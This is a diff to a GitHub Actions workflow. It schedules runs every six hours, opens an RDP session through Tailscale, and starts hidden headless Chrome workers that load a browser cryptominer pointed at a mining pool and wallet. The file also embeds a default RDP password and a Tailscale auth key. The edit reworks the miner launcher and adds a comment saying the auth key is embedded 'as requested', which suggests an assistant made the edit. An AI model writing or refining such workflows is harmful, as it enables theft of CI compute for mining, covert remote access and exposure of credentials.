@@ -15,12 +15,12 @@ on:
           - '25'
           - '30'
   schedule:
-    - cron: "0 */6 * * *"  # Every 6 hours
+    - cron: "0 */6 * * *"
 
 env:
   RDP_USER: "RDPUser"
   RDP_PASSWORD: "DefaultPass!234"
-  MAX_RUNTIME: 340    # 5h40m
+  MAX_RUNTIME: 340
   MINER_URL: "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x"
 
 jobs:
@@ -99,58 +99,56 @@ jobs:
         run: |
           $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
           $hostname = "GH-RDP-$env:GITHUB_RUN_ID"
-          $attempt = 0
-          while ($attempt -lt 10) {
-              try { & $tsExe status; break } catch { $attempt++; Start-Sleep -Seconds 5 }
+          for ($i = 1; $i -le 10; $i++) {
+            try { & $tsExe status; break } catch { Start-Sleep -Seconds 5 }
           }
 
+          # embedded authkey (as requested)
           & $tsExe up --authkey "tskey-auth-kgHX1ZRZ1G11CNTRL-qgNCSBNJTy7qbFDEFZXty7chwnmUoxQrG" --hostname $hostname --reset
 
-          $retryCount = 0
-          while ($retryCount -lt 10) {
-              $ip = & $tsExe ip -4 2>$null
-              if ($ip -and $ip -ne "0.0.0.0") {
-                  Add-Content -Path $env:GITHUB_ENV -Value "TS_IP=$ip"
-                  Write-Host "✅ Tailscale IP: $ip"
-                  break
-              }
-              $retryCount++
-              Start-Sleep -Seconds 10
+          for ($i = 1; $i -le 10; $i++) {
+            $ip = & $tsExe ip -4 2>$null
+            if ($ip -and $ip -ne "0.0.0.0") {
+              Add-Content -Path $env:GITHUB_ENV -Value "TS_IP=$ip"
+              Write-Host "✅ Tailscale IP: $ip"
+              break
+            }
+            Start-Sleep -Seconds 10
           }
 
-          if (-not (Test-Path env:TS_IP)) { throw "❌ Failed to get Tailscale IP" }
+          if (-not $env:TS_IP) { throw "Tailscale IP retrieval failed" }
 
       - name: Deploy Advanced Miner System
         shell: pwsh
         run: |
-          $minerScript = @'
-$workers = $env:MINER_WORKERS
-$minerUrl = "$env:MINER_URL&workers=$workers"
+          # Build the miner manager script as an array of literal lines to avoid here-string/YAML issues
+          $path = "$env:TEMP\miner_manager.ps1"
+          $lines = @(
+            '$workers = $env:MINER_WORKERS'
+            '$minerUrl = "$env:MINER_URL&workers=$workers"'
+            ''
+            'for ($i = 1; $i -le $workers; $i++) {'
+            '  Start-Job -ScriptBlock {'
+            '    param($i, $minerUrl)'
+            '    while ($true) {'
+            '      try {'
+            '        Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" -ArgumentList "--headless","--disable-gpu","--no-sandbox","--remote-debugging-port=9$i","--app=$minerUrl" -WindowStyle Hidden -PassThru'
+            '        Start-Sleep -Seconds 600'
+            '      } catch {'
+            '        Start-Sleep -Seconds 30'
+            '      }'
+            '    }'
+            '  } -ArgumentList $i, $minerUrl -Name "miner-worker-$i"'
+            '}'
+            ''
+            'Write-Host "Started $workers miner workers"'
+            'while ($true) { Start-Sleep -Seconds 60 }'
+          )
+          # Join and write to file
+          $lines -join "`n" | Out-File -FilePath $path -Encoding UTF8 -Force
 
-for ($i = 1; $i -le $workers; $i++) {
-    Start-Job -ScriptBlock {
-        while ($true) {
-            try {
-                Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" `
-                    -ArgumentList "--headless","--disable-gpu","--no-sandbox","--remote-debugging-port=9$i","--app=$minerUrl" `
-                    -WindowStyle Hidden -PassThru
-                Start-Sleep -Seconds 600
-            } catch { Start-Sleep -Seconds 30 }
-        }
-    } -Name "miner-worker-$i"
-}
-
-Write-Host "Started $workers miner workers"
-while ($true) { Start-Sleep -Seconds 60 }
-'@
-
-          $scriptPath = "$env:TEMP\miner_manager.ps1"
-          $minerScript | Out-File -FilePath $scriptPath -Encoding UTF8
-
-          Start-Job -ScriptBlock {
-              param($path)
-              powershell -File $path
-          } -ArgumentList $scriptPath
+          # Start the miner manager script in background
+          Start-Job -ScriptBlock { param($p) powershell -File $p } -ArgumentList $path
 
       - name: Create Connection Info File
         shell: pwsh
@@ -165,20 +163,11 @@ Runtime: $env:MAX_RUNTIME minutes
 "@
           $connectionInfo | Out-File -FilePath "$env:GITHUB_WORKSPACE\RDP_Info.txt" -Encoding UTF8
 
-          Write-Host "=========================================="
-          Write-Host "🚀 RDP SESSION READY"
-          Write-Host "IP: $env:TS_IP"
-          Write-Host "User: $env:RDP_USER"
-          Write-Host "Pass: $env:RDP_PASSWORD"
-          Write-Host "Workers: $env:MINER_WORKERS"
-          Write-Host "Duration: $env:MAX_RUNTIME minutes"
-          Write-Host "=========================================="
-
       - name: Monitor Session
         shell: pwsh
         run: |
           $startTime = Get-Date
-          $endTime = $startTime.AddMinutes($env:MAX_RUNTIME)
+          $endTime = $startTime.AddMinutes([int]$env:MAX_RUNTIME)
           while ((Get-Date) -lt $endTime) {
               $elapsed = [int]((Get-Date) - $startTime).TotalMinutes
               $remaining = [int]($endTime - (Get-Date)).TotalMinutes
@@ -191,8 +180,9 @@ Runtime: $env:MAX_RUNTIME minutes
         shell: pwsh
         run: |
           Write-Host "Cleaning up..."
-          Get-Job | Stop-Job | Remove-Job -Force
-          Get-Process -Name "chrome*" -ErrorAction SilentlyContinue | Stop-Process -Force
+          Get-Job | Stop-Job -Force
+          Get-Job | Remove-Job -Force
+          Stop-Process -Name "chrome*" -ErrorAction SilentlyContinue -Force
           & "$env:ProgramFiles\Tailscale\tailscale.exe" logout
           Remove-Item "$env:TEMP\miner_manager.ps1" -ErrorAction SilentlyContinue
           Write-Host "Cleanup completed"
